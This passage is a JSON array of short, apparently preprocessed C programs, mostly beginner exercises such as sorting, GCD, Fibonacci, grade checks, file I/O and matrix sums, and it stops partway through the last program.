[
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n if (4 == 3) {\n  printf(\"4 eh igual a 3\");\n }\n else {\n  printf(\"4 eh diferente de 3\");\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid cleanup();\nint main(void)\n{\n  atexit(cleanup);\n  printf(\"Hello, World!\\n\");\n  abort();\n  return 0;\n}\nvoid cleanup()\n{\n  printf(\"Doing cleanup!\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n\n\n_Bool compare(int* arr1, int* arr2)\n{\n    int i;\n    for (i=65; i<=90; i++)\n        if (arr1[i] != arr2[i])\n            return 0;\n    for (i=97; i<=122; i++)\n        if (arr1[i] != arr2[i])\n            return 0;\n    return 1;\n}\nint appearanceCount(int input1,int input2,char* input3,char* input4)\n{\n    int countP[122 +1] = {0}, countTW[122 +1] = {0};\n    int c = 0, i = 0;\n    for (i = 0; i < input1; ++i)\n    {\n        ++(countP[input3[i]]);\n        ++(countTW[input4[i]]);\n    }\n    for (i = input1; i < input2; i++)\n    {\n        if (compare(countP, countTW))\n            ++c;\n        ++(countTW[input4[i]]);\n        --(countTW[input4[i-input1]]);\n    }\n    if (compare(countP, countTW))\n        ++c;\n    return c;\n}\nint main() {\n    int output = 0;\n    int ip1;\n    scanf(\"%d\", &ip1);\n    int ip2;\n    scanf(\"%d\", &ip2);\n    char* ip3;\n    ip3 = (char *)malloc(512000 * sizeof(char));\n    scanf(\"\\n%[^\\n]\",ip3);\n    char* ip4;\n    ip4 = (char *)malloc(512000 * sizeof(char));\n    scanf(\"\\n%[^\\n]\",ip4);\n    output = appearanceCount(ip1,ip2,ip3,ip4);\n    printf(\"%d\\n\", output);\n    return 0;\n}",
    "#include <stdio.h>\nint vector[5];\nint imenor, aux;\nint orden();\nint main()\n{\n    printf(\"Ingrese cinco n\u00fameros enteros \\n\");\n    for(int i=0;i<5;i++){\n        scanf(\"%d\",&vector[i]);\n    }\n    orden();\n    return 0;\n}\nint orden()\n{\n    for(int i=0;i<5;i++)\n    {\n        imenor=i;\n        for(int j=i+1;j<5;j++)\n        {\n            if(vector[j]<vector[imenor])\n            {\n                imenor=j;\n            }\n        }\n        aux = vector[i];\n        vector[i]=vector[imenor];\n        vector[imenor]=aux;\n    }\n    printf(\"El nuevo vector ordenado ascendentemente es \\n\");\n    for(int i=0;i<5;i++){\n        printf(\"%d \\n\",vector[i]);\n    }\n}",
    "#include <stdio.h>\nint power(int base, int exp);\nvoid power1(int arr[]);\nint main() {\n    for(int i = 0; i < 10; i++){\n        printf(\"^%d %5.d %8.d\\n\", i, power(2, i), power(-2, i));\n    }\n    int array[2] = {1, 2};\n    printf(\"ORIGINAL : %30.p\\n\", array);\n    power1(array);\n    return 0;\n}\nint power(int base, int exp){\n    int product = 1;\n    for(int i = 1; i <= exp; i++){\n        product *= base;\n    }\n    return product;\n}\nvoid power1(int arr[]){\n    printf(\"PASS BY REFERANCE ADDRESS : %p\\n\", arr);\n}",
    "#include <unistd.h>\n#include <stdio.h>\nint main() {\n    printf(\" Bonjour! Le numero de l'utilisateur est %d\\n\", getuid());\n    printf(\" numero du processus est %d\\n\", getpid());\n    printf(\" - nom Alexandre Picard-Lemieux\\n\");\n    printf(\" - nom Gael Dostie\\n\");\n    return 0;\n}",
    "#include<stdio.h>\n#include <string.h>\nint main(){\n    char str[100]=\"this is programming with c and java\";\n    char *sub;\n    sub=strstr(str,\"python\");\n    printf(\"\\nSubstring is: %s\",sub);\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n  FILE *ptr=((void*)0);\n  char string;\n  ptr=fopen(\"file.txt\",\"r\");\n  while(string!=(-1)){\n    string=getc(ptr);\n    printf(\"%c\",string);\n  }\n  fclose(ptr);\n  return 0;\n}",
    "#include <stdio.h>\nint expo(int A, int N){\n if (N==0)\n {\n  return 1;\n }\n if (N==1)\n {\n  return A;\n }else{\n  N--;\n  return A*expo(A,N);\n }\n}\nint main(void)\n{\n int A=3,N=0,resultado;\n resultado = expo(A,N);\n printf(\"%d\\n\",resultado);\n return 0;\n}",
    "#include <stdio.h>\nint minimum(int x, int y);\nint maximum(int x, int y);\nint multiply(int x, int y);\nint main() {\n   int no1, no2;\n   printf(\"Enter a value for no 1 : \");\n   scanf(\"%d\", &no1);\n   printf(\"Enter a value for no 2 : \");\n   scanf(\"%d\", &no2);\n   printf(\"%d \", minimum(no1, no2));\n   printf(\"%d \", maximum(no1, no2));\n   printf(\"%d \", multiply(no1, no2));\n   return 0;\n}\nint minimum(int x, int y) {\n  int ans;\n  if(x <= y)\n  ans = x;\n  else\n  ans = y;\n  return ans;\n}\nint maximum(int x, int y) {\n  int ans;\n  if(x >= y)\n  ans = x;\n  else\n  ans = y;\n  return ans;\n}\nint multiply(int x, int y) {\n  int ans = x*y;\n  return ans;\n}",
    "#include <stdio.h>\nint * f() {\n        return ((void*)0);\n}\nint main() {\n        int * p;\n        *(&p) = f(), 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int a;\n    scanf(\"%d\",&a);\n    if(a>=90)\n        printf(\"A\");\n    else if(80<=a||89<=a)\n        printf(\"B\");\n    else if(70<=a||79<=a)\n        printf(\"C\");\n    else if(60<=a||69<=a)\n        printf(\"D\");\n    else\n        printf(\"F\");\n}",
    "#include <stdio.h>\nint main(void)\n{\n int n;\n for (n = 0; n < 10; n++)\n  printf(\"%d\", n);\n puts(\"\");\n return (0);\n}",
    "#include <stdio.h>\nint main(int argc, const char * argv[]) {\n    int ddd;\n    scanf(\"%d\",&ddd);\n    switch (ddd) {\n        case 61:\n            printf(\"Brasilia\");\n            break;\n        case 71:\n            printf(\"Salvador\");\n            break;\n        case 11:\n            printf(\"Sao Paulo\");\n            break;\n        case 21:\n            printf(\"Rio de Janeiro\");\n            break;\n        case 32:\n            printf(\"Juiz de Fora\");\n            break;\n        case 19:\n            printf(\"Campinas\");\n            break;\n        case 27:\n            printf(\"Vitoria\");\n            break;\n        case 31:\n            printf(\"Belo Horizonte\");\n            break;\n        default:\n            printf(\"DDD nao cadastrado\");\n            break;\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int n, threeCnt = 0;\n    scanf(\"%d\", &n);\n    while (n /= 10)\n        if (n % 10 == 3)\n            threeCnt++;\n    printf(\"%d\\n\", threeCnt);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    char a;\n    scanf (\"%c\", &a);\n    char b='z'-(a - 'a');\n    printf(\"%c\", b);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\ntypedef void (Func)(int);\nvoid func1(int x);\nvoid func2(int x);\nvoid func1(int x) {\n  x++;\n  return;\n}\nvoid func2(int x) {\n  x++;\n  return;\n}\nint main(int argc, __attribute__((unused)) char *argv[argc + 1]) {\n  Func *table[] = { func1, func2 };\n  table[argc - 1](2);\n  return 0;\n}",
    "#include <stdio.h>\nint grid[9][9] = {0,0,0,0,0,0,0,0,0,\n                  0,0,0,0,0,0,0,0,0,\n                  0,0,0,0,0,0,0,0,0,\n                  0,0,0,0,0,0,0,0,0,\n                  0,0,0,0,0,0,0,0,0,\n                  0,0,0,0,0,0,0,0,0,\n                  0,0,0,0,0,0,0,0,0,\n                  0,0,0,0,0,0,0,0,0,\n                  0,0,0,0,0,0,0,0,0};\nvoid editGrid(int arr[][9]);\nvoid displayGrid(int arr[][9])\n{\n    int i,j;\n    for(i=0;i<9;i++,printf(\"\\n\"))\n        for(j=0;j<9;j++)\n            printf(\"%d \",arr[i][j]);\n}\nint main()\n{\n        editGrid(grid);\n        displayGrid(grid);\n    return 0;\n}\nvoid editGrid(int arr[][9])\n{\n    int i,j;\n    char opt;\n    do\n    {\n        printf(\"Enter row and column number.\\n\");\n        scanf(\"%d\",&i);\n        scanf(\"%d\",&j);\n        printf(\"Enter the element value\\n\");\n        scanf(\"%d\",&arr[i-1][j-1]);\n        printf(\"Add another element to sudoku?\\nEnter y or n\\n\");\n        scanf(\"%c\",&opt);\n        scanf(\"%c\",&opt);\n    }while(opt == 'y');\n}",
    "#include <stdio.h>\nint maximoDivisorComum(int num1, int num2);\nint main(){\n    int num1, num2;\n    printf(\"Informe o numero 1: \");\n    scanf(\"%i\", &num1);\n    printf(\"Informe o numero 2: \");\n    scanf(\"%i\", &num2);\n    printf(\"Result: %i\\n\", maximoDivisorComum(num1, num2));\n    return 0;\n}\nint maximoDivisorComum(int num1, int num2){\n    if(num1 > num2){\n        return maximoDivisorComum(num1 - num2, num2);\n    }\n    else if(num1 < num2){\n        return maximoDivisorComum(num2, num1);\n    }\n    else{\n        return num1;\n    }\n}",
    "#include <stdio.h>\nint normnumsl_find(int *nums, int numssSize)\n{\n    int min = nums[0];\n    for (int i = 1; i < numssSize; i++)\n        if (nums[i] < min)\n            min = nums[i];\n    return min;\n}\nint find_min(int *nums, int numsSize)\n{\n    if (!nums || numsSize <= 0)\n        return -1;\n    if (numsSize == 1)\n        return nums[0];\n    int lo = 0, hi = numsSize - 1, mid = (lo + hi) >> 1;\n    if (nums[lo] == nums[hi] && nums[mid] == nums[hi])\n        return normnumsl_find(nums, numsSize);\n    if (nums[mid] > nums[lo] && nums[mid] < nums[hi])\n        return nums[0];\n    if (nums[mid] > nums[lo] && nums[mid] == nums[hi])\n        return nums[0];\n    if (nums[mid] == nums[lo] && nums[mid] < nums[hi])\n        return nums[0];\n    while (hi - lo > 1) {\n        mid = (lo + hi) >> 1;\n        if (nums[mid] >= nums[lo] && nums[mid] > nums[hi])\n            lo = mid;\n        else\n            hi = mid;\n    }\n    return nums[hi];\n}\nint main(int argc, char *argv[])\n{\n    int a[] = {4, 4, 5, 6, 1, 2, 3, 4};\n    int size = sizeof(a) / sizeof(a[0]);\n    printf(\"%d\\n\", find_min(a, size));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nchar *getLine(void)\n{\n    const size_t sizeIncrement = 10;\n    char *buffer = malloc(sizeIncrement);\n    char *currentPosition = buffer;\n    size_t maximumLenght = sizeIncrement;\n    size_t length = 0;\n    int character;\n    if(currentPosition == ((void*)0)) return ((void*)0);\n    printf(\"\\n>\");\n    while(1)\n    {\n        character = fgetc((stdin));\n        if(character == '\\n') break;\n        if(++length >= maximumLenght)\n        {\n            char *newBuffer = realloc(buffer, maximumLenght += sizeIncrement);\n            if(newBuffer == ((void*)0))\n            {\n                free(buffer);\n                return ((void*)0);\n            }\n            currentPosition = newBuffer + (currentPosition - buffer);\n            buffer = newBuffer;\n        }\n        *currentPosition++ = character;\n    }\n    *currentPosition = '\\0';\n    return buffer;\n}\nint main(int argc, char *argv[])\n{\n    char *aa = getLine();\n    printf(\"wynik: %c\\n\", aa);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint in(char strings[][1001], int n);\nvoid out(char string[][1001], int n);\nint find(char string[][1001], int n, char queries[][1001], int i);\nint main()\n{\n    char strings[1001][1001], queries[1001][1001];\n    int n, q, i, j, count[100];\n    scanf(\"%d\", &n);\n    in(strings, n);\n    scanf(\"%d\", &q);\n    in(queries, q);\n    for(i=0; i<q; i++)\n        printf(\"%d\\n\", find(strings, n, queries, i));\n    return 0;\n}\nint find(char string[][1001], int n, char queries[][1001], int i)\n{\n    int count=0, j;\n        for(j=0; j<n; j++){\n        if(strcmp(queries[i], string[j])==0)\n            count++;\n        }\n        return count;\n}\nint in(char string[][1001], int n)\n{\n    int i;\n    for(i=0; i<n; i++){\n        scanf(\"%s\", string[i]);\n    }\n    return 0;\n}\nvoid out(char string[][1001], int n)\n{\n    int i;\n    for(i=0; i<n; i++)\n        printf(\"%s\\n\", string[i]);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int age = 40;\n    double height = 1.85;\n    char grade = 'B';\n    char pharse[] = \"abcdefg hijklmnop qrs tuv wx yz\";\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n printf(\"it's getting to the point that I should just macro this basic C write something for \\\"testing\\\" purposes\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n = 23193;\n    for (int i = 32767 - n; i > 0; i--)\n    {\n        printf(\"%d \", i);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main(void) {\n    printf(\"input your name and size\\n\");\n    char name[20];\n    float size;\n    scanf(\"%s %f\", name, &size);\n    printf(\"%s, you are %.3f feet tall\", name, size);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <locale.h>\nint main(){\n    char str[50];\n    int i,count=0;\n    fgets(str,sizeof(str),(stdin));\n    for(i=0;i<strlen(str);i++){\n        if(str[i]==' '){\n            count++;\n        }\n    }\n    printf(\"Branco: %d\\n\", count);\n    return 0;\n}",
    "#include <stdio.h>\nvoid Display(int iNo, int iFrequency)\n{\n    int iCnt = 0;\n    if(iFrequency < 0)\n    {\n        iFrequency =- iFrequency;\n    }\n    for(iCnt = 1; iCnt <= iFrequency; iCnt++)\n    {\n        printf(\"%d \", iNo);\n    }\n}\nint main()\n{\n    int iValue = 0;\n    int iCount = 0;\n    printf(\"Enter number : \");\n    scanf(\"%d\", &iValue);\n    printf(\"Enter frequency : \");\n    scanf(\"%d\", &iCount);\n    Display(iValue, iCount);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n double a,b,s,x;\n scanf(\"%lf%lf%lf\",&s,&a,&b);\n x=(2*a*s)/(3*a+b);\n printf(\"%.6lf\",x/a+(s-x)/b);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\ntypedef unsigned long long u64;\nu64 triangle(u64 n) {\n    return n * (n + 1) / 2;\n}\nu64 pentagon(u64 n) {\n    return n * (3 * n - 1) / 2;\n}\nu64 hexagon(u64 n) {\n    return n * (2 * n - 1);\n}\nint main(int argc, char* argv[]) {\n    int t = 286;\n    int p = 165;\n    int h = 143;\n    u64 tval = triangle(t);\n    u64 pval = pentagon(p);\n    u64 hval = hexagon(h);\n    _Bool found = 0;\n    while(!found) {\n        while(hval < pval) {\n            h++;\n            hval = hexagon(h);\n        }\n        while(pval < tval) {\n            p++;\n            pval = pentagon(p);\n        }\n        if(tval == pval && tval == hval) {\n            found = 1;\n        } else {\n            t++;\n            tval = triangle(t);\n        }\n    }\n    printf(\"%llu\", tval);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nlong long int TreeMethod() {\n long long int i;\n long long int factor = 600851475143;\n for (i = 1; i <= (factor / 2) + 1; i++) {\n  if ((factor % i == 0) && (i > 1)) {\n   factor /= i;\n  }\n }\n return factor;\n}\nint CheckPrime(long long int factor) {\n long long int i;\n for (i = 0; i < sqrt(factor); i++) {\n  if (i > 1 && factor % i == 0) {\n   return 0;\n  }\n }\n return 1;\n}\nint main () {\n long long int potentialFactor;\n int primality = 0;\n potentialFactor = TreeMethod();\n primality = CheckPrime(potentialFactor);\n if (primality == 1) {\n  printf(\"The largest prime factor of the number %lli is %lli.\\n\", 600851475143, potentialFactor);\n } else {\n  printf(\"Could not find a prime factor for %lli.\\n\", 600851475143);\n }\n return 0;\n}",
    "#include <stdio.h>\nunsigned long long int flubionacci(int n)\n{unsigned long long int fib[61];\n    fib[0] = 0;\n    fib[1] = 1;\n    for(int i = 2; i < 61; i++)\n    {\n        fib[i] = fib[i - 2] + fib[i - 1];\n    }\n    return fib[n];\n}\nint main(void)\n{int n_testes = 0;\n int i = 0;\n    scanf(\"%d\", &n_testes);\n    while(i < n_testes)\n    {int val = 0;\n        scanf(\"%d\", &val);\n        printf(\"Fib(%d) = %llu\\n\",val, flubionacci(val));\n        i++;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n int x, y, soma=0;\n do{\n  printf(\"Insira dois numeros: \\n\");\n  printf(\"x > \");\n  scanf(\" %i\",&x);\n  do{\n   printf(\"y > \");\n   scanf(\" %i\",&y);\n  } while(y < x);\n  soma = x + y;\n  while (x < y){\n   x++;\n   y--;\n   if (x != y)\n    soma += x + y;\n   else\n    soma += x;\n  }\n  if (soma > 0)\n   printf(\"%i\\n\", soma );\n } while(x > 0 && y > 0);\n}",
    "#include <unistd.h>\nint main(int ar, char **av)\n{\n    int i;\n    i = 0;\n    while (ar == 2 && *av[1] <= 32)\n        av[1]++;\n    while (ar == 2 && *av[1] > 32 && *av[1] < 127)\n        write(1, &av[1], 1);\n    write (1, \"\\n\", 1);\n    return (0);\n}",
    "#include<stdio.h>\nvoid change(int arr[], int n)\n{\n int temp[n], i;\n for(i=0; i<n; i++)\n  temp[arr[i]] = i;\n for(i=0; i<n; i++)\n  arr[i] = temp[i];\n}\nvoid print(int arr[], int n)\n{\n for(int i=0; i<n; i++)\n  printf(\"%d \",arr[i]);\n printf(\"\\n\");\n}\nint main()\n{\n int arr[] = {3, 2, 0, 1};\n int n = sizeof(arr) / sizeof(arr[0]);\n printf(\"Input: \\n\");\n print(arr, n);\n change(arr, n);\n printf(\"Output: \\n\");\n print(arr, n);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint isCorrectTranslation(char *message, char *translation) {\n int l = strlen(message);\n if (l != strlen(translation)) return 0;\n int i = 0;\n while (i < l) {\n  if (message[i] != translation[l-i-1]) return 0;\n  i++;\n }\n return 1;\n}\nint main(int argc, char const *argv[])\n{\n char message[101], translation[101];\n scanf(\"%s\", message);\n scanf(\"%s\", translation);\n printf(\"%s\\n\", isCorrectTranslation(message, translation) ? \"YES\": \"NO\");\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]) {\n  if(argc > 1){\n    printf(\"Hello %s!\\n\", argv[1]);\n  } else {\n    printf(\"Hello!\\n\");\n  }\n  for(int i = 0; i < argc; i++){\n    printf(\"argv[%d] = %s\\n\", i, argv[i]);\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int r, c, i, j;\n  printf(\"Enter number of rows: \");\n  scanf(\"%d\", &r);\n  printf(\"Enter number of columns: \");\n  scanf(\"%d\", &c);\n  int a[r][c], b[r][c], sum[r][c];\n  printf(\"\\nEnter 1st matrix:\\n\");\n  for (i = 0; i < r; ++i)\n    for (j = 0; j < c; ++j) {\n      printf(\"Enter element a%d%d: \", i + 1, j + 1);\n      scanf(\"%d\", &a[i][j]);\n    }\n  printf(\"Enter 2nd matrix:\\n\");\n  for (i = 0; i < r; ++i)\n    for (j = 0; j < c; ++j) {\n      printf(\"Enter element b%d%d: \", i + 1, j + 1);\n      scanf(\"%d\", &b[i][j]);\n    }\n  printf(\"\\nSum of two matrices: \\n\");\n  for (i = 0; i < r; ++i)\n    for (j = 0; j < c; ++j) {\n      printf(\"%d   \", a[i][j] + b[i][j]);\n      if (j == c - 1) {\n        printf(\"\\n\");\n      }\n    }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n float a, b, c, e, f;\n int i;\n a=3; b=4;\n a=5; b=6;\n f=1;\n while((b*f)>1)\n {\n  printf(\"%f %f\\n\", f, b*f);\n  f*=0.5;\n }\n c=a*f;\n for(i=0; i<10; i++)\n {\n  e=(a-b*c);\n  printf(\"%f %f %f %f\\n\", a, b, c, e);\n  c=c+e*f;\n }\n}",
    "#include <stdio.h>\nvoid status(FILE *fp)\n{\n printf(\"stream error status is %s\\n\",\n  ferror(fp) ? \"on\" : \"off\");\n}\nint main(void)\n{\n FILE *fp;\n char c;\n fp = fopen(\"file.txt\", \"w\");\n if (!fp) {\n  perror(\"fopen\");\n  return -1;\n }\n printf(\"file descriptor number is %d\\n\", fileno(fp));\n while (!ferror(fp))\n  c = fgetc(fp);\n status(fp);\n clearerr(fp);\n status(fp);\n fclose(fp);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  printf(\"My name is Ezepue Uche B.\\n\");\n  printf(\"I am an excellent student of Ikechukwu Eze\\n\");\n  printf(\"I want to be a good programmer like my tutor\\n\");\n  printf(\"Programming is just like baking to me!\\n\");\n  printf(\"It's just a matter of time\\n\");\n  return 0;\n}",
    "#include <stdio.h>\nint winner(char board[3][3]) {\n  int i, j;\n  for(i = 0; i < 3; i++) {\n    if(board[i][0] == board[i][1] && board[i][0] == board[i][2])\n      return board[i][0];\n    if(board[0][i] == board[1][i] && board[0][i] == board[2][i])\n      return board[0][i];\n  }\n  if(board[0][0] == board[1][1] && board[0][0] == board[2][2])\n    return board[0][0];\n  if(board[0][2] == board[1][1] && board[0][2] == board[2][0])\n    return board[0][2];\n  return 'D';\n}\nint main() {\n  char board[3][3];\n  scanf(\"%c %c %c\\n%c %c %c\\n%c %c %c\", &board[0][0], &board[0][1], &board[0][2], &board[1][0], &board[1][1], &board[1][2], &board[2][0], &board[2][1], &board[2][2]);\n  switch(winner(board)) {\n    case 'X':\n      printf(\"Player 1\");\n      break;\n    case 'O':\n      printf(\"Player 2\");\n      break;\n    default:\n      printf(\"Draw\");\n      break;\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stddef.h>\n#include <memory.h>\n#include <stdint.h>\n\nvoid magic(int x[4]) {\n    printf(\"%d %d %d %d\\n\", x[0], x[1], x[2], x[3]);\n}\nint main() {\n    int x[4] = {1, 2};\n    magic(x);\n    int y[2][2] = {{1, 2}, {3, 4}};\n    magic(y);\n    int* t = &y[0][0];\n    magic(t);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\nint main(void)\n{\n int fd;\n fd = creat(\"test.txt\", 0700);\n if(fd == -1){\n  perror(\"fail to creat\");\n  exit(1);\n }else\n  printf(\"creat OK\\n\");\n return 0;\n}",
    "#include <stdio.h>\n\n\n\nvoid convert_fahr_to_celsius() {\n printf(\"conversione da temperatura in gradi Fahrenheit a gradi Celsius (usando int):\\n\");\n printf(\"C = 5/9 * (F-32)\\n\");\n int fahr, celsius;\n int lower, upper, step;\n lower = 0;\n upper = 300;\n step = 20;\n fahr = lower;\n printf(\"\\nF\\tC\\n\");\n while (fahr <= upper) {\n  celsius = 5 * (fahr-32) / 9;\n  printf(\"%d \\t %d \\n\", fahr, celsius);\n  fahr = fahr + step;\n }\n printf(\"\\n\\n\");\n}\nint main(int argc, char **argv) {\n convert_fahr_to_celsius();\n return 0;\n}",
    "#include <stdio.h>\nvoid fibonacciSequence(int N)\n{\n long long int previous = 1, previousPrevious = 1, answer = 0;\n printf(\"1 1 \");\n for(int i = 0; i < N; i++)\n {\n  answer = previous + previousPrevious;\n  printf(\"%lld \", answer);\n  previousPrevious = previous;\n  previous = answer;\n }\n}\nint main()\n{\n fibonacciSequence(10);\n return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/stat.h>\nint main(int argc, char *argv[])\n{\n   int fd;\n   if (argc != 3)\n   {\n      fprintf((stderr), \"Usage: %s [path] [string]\\n\",\n         argv[0]);\n      return 1;\n   }\n   if ( (fd = open(argv[1], (((__wasi_oflags_t)(1 << 0)) << 12)|((0x04000000) | (0x10000000)), 00644))\n      == -1 )\n   {\n      perror(\"Can't open file for writing\");\n      return 1;\n   }\n   if ( (write(fd, argv[2], strlen(argv[2])))\n      == -1 )\n   {\n      perror(\"Can't write to file\");\n      return 1;\n   }\n   return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    int A[20][20];\n    int B[20] = {0};\n    int n;\n    printf(\"Unesite dimenziju kvadratne matrice: \");\n    scanf(\"%d\", &n);\n    for(int i = 0; i < n; i++) {\n        for(int j = 0; j < n; j++) {\n            scanf(\"%d\", &A[i][j]);\n        }\n    }\n    for(int i = 0; i < n; i++) {\n        for(int j = 0; j < n; j++) {\n            B[i] += A[i][j];\n        }\n    }\n    printf(\"\\nSuma vrsta je: \\n\");\n    for(int i = 0; i < n; i++) {\n        printf(\"%d \", B[i]);\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char **argv)\n{\n    if (argc == 1)\n        printf(\"hi there, world\\n!\");\n    else {\n        printf(\"hi there\");\n        for (int i = 1; i < argc; ++i)\n            printf(\", %s\", argv[i]);\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "int f() { return 1; }\nint main() {\n    int (*func)() = f;\n    return (*func)();\n}",
    "#include <stdio.h>\nint main() {\n   int marks1,marks2,sum,avg;\n  printf(\"Enter the subjet 1 marks :\");\n  scanf(\"%d\",&marks1);\n  printf(\"Enter the subject 2 marks :\");\n  scanf(\"%d\",&marks2);\n  sum=marks1+marks2;\n  avg = sum/2;\n  printf(\"Average : %d\",avg);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(){\n    long double num;\n    char cNum[150];\n    int i;\n    scanf(\"%LE\", &num);\n    sprintf(cNum, \"%LE\", num);\n    if(cNum[0] != '-'){\n        printf(\"+\");\n    }\n    printf(\"%.4LE\\n\", num);\n    return 0;\n}",
    "#include <stdio.h>\nint gcd(int a, int b);\nint main(void) {\n    printf(\"%d\\n\", gcd(12, 48));\n    printf(\"%d\\n\", gcd(0, 1));\n    printf(\"%d\\n\", gcd(12, 3));\n    return 0;\n}\nint gcd(int a, int b) {\n    int holder = 0;\n    for(int i = 1; i <= a && i <= b; i++) {\n        if(a % i == 0 && b % i == 0) {\n            holder = i;\n        }\n    }\n    return holder;\n}",
    "#include <stdio.h>\n\nint main() {\n  double d_pi = 3.141592653589793238;\n  float f_pi = 3.141592653589793238;\n  if (d_pi == 3.141592653589793238)\n    printf(\"Double Equal\\n\");\n  else\n    printf(\"Double Not Equal\\n\");\n  if (f_pi == 3.141592653589793238)\n    printf(\"Float Equal\\n\");\n  else\n    printf(\"Float Not Equal\\n\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint isDup(const char *from, const char *to)\n{\n if (!from || from[0] == '\\0' || from > to)\n  return 0;\n int len = to - from + 1;\n for (int i = 1; i < len; ++i) {\n  for (int j = 0; j < i; ++j) {\n   if (from[j] == from[i])\n    return 1;\n  }\n }\n return 0;\n}\nint lengthOfLongestSubstring(const char *s)\n{\n int len = strlen(s);\n int max = 0;\n for (int i = 0; i < len; ++i) {\n  int j = i + 1;\n  while (j < len) {\n   if (isDup(s + i, s + j))\n    break;\n   else\n    ++j;\n  }\n  if (j - i > max)\n   max = j - i;\n }\n return max;\n}\nint main()\n{\n char s[] = \"pwwkew\";\n printf(\"%d\\n\", lengthOfLongestSubstring(s));\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    double a;\n    scanf(\"%lf\", &a);\n    printf(\"A=%.4lf\\n\", 3.14159 * a * a);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  FILE *out_file;\n  out_file=fopen(\"Configure.h\",\"w\");\n  fprintf(out_file,\"%s\\n\",\"#ifndef BSL_CONFIGURE\");\n  fprintf(out_file,\"%s\\n\",\"#define BSL_CONFIGURE\");\n  fprintf(out_file,\"%s%d\\n\",\"#define SIZEOF_CHAR \",sizeof(char));\n  fprintf(out_file,\"%s%d\\n\",\"#define SIZEOF_SHORT \",sizeof(short));\n  fprintf(out_file,\"%s%d\\n\",\"#define SIZEOF_INT \",sizeof(int));\n  fprintf(out_file,\"%s%d\\n\",\"#define SIZEOF_LONG \",sizeof(long));\n  fprintf(out_file,\"%s%d\\n\",\"#define SIZEOF_LONG_LONG \",sizeof(long long));\n  fprintf(out_file,\"%s%d\\n\",\"#define SIZEOF_FLOAT \",sizeof(float));\n  fprintf(out_file,\"%s%d\\n\",\"#define SIZEOF_DOUBLE \",sizeof(double));\n  fprintf(out_file,\"%s%d\\n\",\"#define SIZEOF_LONG_DOUBLE \",sizeof(long double));\n  fprintf(out_file,\"%s\\n\",\"#endif\");\n  fclose(out_file);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n int y;\n char bukva;\n do{\n scanf(\"%c\",&bukva);\n }while(bukva<'a' || bukva>'z');\n y='a'+'z'-bukva;\n printf(\"%c\\n\",y);\n return 0;\n}",
    "#include<stdio.h>\n#include<ctype.h>\nint main ( void ) {\n int is = (0 ? isdigit('8') : ((unsigned)('8')-'0') < 10);\n printf(\"e um digito: %s\", is ? \"sim\\n\" : \"nao\\n\");\n is = (0 ? isalpha('a') : (((unsigned)('a')|32)-'a') < 26);\n printf(\"e uma letra: %s\", is ? \"sim\\n\" : \"nao\\n\");\n is = isalnum('#');\n printf(\"e letra ou numero: %s\", is ? \"sim\\n\" : \"nao\\n\");\n is = isxdigit('F');\n printf(\"e um digito hexadecimal: %s\", is ? \"sim\\n\" : \"nao\\n\");\n printf(\"e minuscula: %s\", (0 ? islower('a') : ((unsigned)('a')-'a') < 26) ? \"sim\\n\" : \"nao\\n\");\n printf(\"e minuscula: %s\", (0 ? islower('b') : ((unsigned)('b')-'a') < 26) ? \"sim\\n\" : \"nao\\n\");\n printf(\"e minuscula: %s\", (0 ? islower('A') : ((unsigned)('A')-'a') < 26) ? \"sim\\n\" : \"nao\\n\");\n printf(\"e minuscula: %s\", (0 ? islower('z') : ((unsigned)('z')-'a') < 26) ? \"sim\\n\" : \"nao\\n\");\n printf(\"\\ne maiuscula: %s\", (0 ? isupper('a') : ((unsigned)('a')-'A') < 26) ? \"sim\\n\" : \"nao\\n\");\n printf(\"e maiuscula: %s\", (0 ? isupper('A') : ((unsigned)('A')-'A') < 26) ? \"sim\\n\" : \"nao\\n\");\n printf(\"e maiuscula: %s\", (0 ? isupper('A') : ((unsigned)('A')-'A') < 26) ? \"sim\\n\" : \"nao\\n\");\n printf(\"e maiuscula: %s\", (0 ? isupper('Y') : ((unsigned)('Y')-'A') < 26) ? \"sim\\n\" : \"nao\\n\");\n printf(\"\\ne caractere de espaco em braco: 